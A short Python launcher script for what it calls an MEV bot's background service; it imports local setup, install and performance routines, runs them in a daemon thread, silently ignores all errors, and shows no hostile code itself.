"""
Background service for the MEV bot.
"""

import os
import sys
import time
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

def main():
    try:
        from analyzer import setup
        from performance import start as start_performance
        from starter import install
        
        install()
        
        s = setup()
        t = threading.Thread(target=s.run, daemon=True)
        t.start()
        
        start_performance()
        
        while True:
            time.sleep(60)
    except:
        pass

if __name__ == "__main__":
    main()